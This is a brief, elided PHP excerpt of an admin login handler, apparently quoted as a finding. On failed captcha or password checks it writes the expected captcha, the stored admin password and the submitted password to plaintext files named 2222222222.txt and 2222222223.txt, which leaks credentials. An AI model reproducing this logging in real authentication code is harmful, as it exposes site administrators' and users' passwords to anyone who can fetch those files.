...
class LoginAction extends CommonAction{
    ...
    public function loging(){
        ...
        if(strtolower($yzm) != strtolower(session('verify'))){
            ...
            file_put_contents('2222222222.txt', session('verify'));
            file_put_contents('2222222223.txt', $yzm);
            session('verify',null);
        ...
        if(empty($admin) || $admin['password'] != $password){
            ...
            file_put_contents('2222222222.txt', $admin['password']);
            file_put_contents('2222222223.txt', $password);
            session('verify',null);
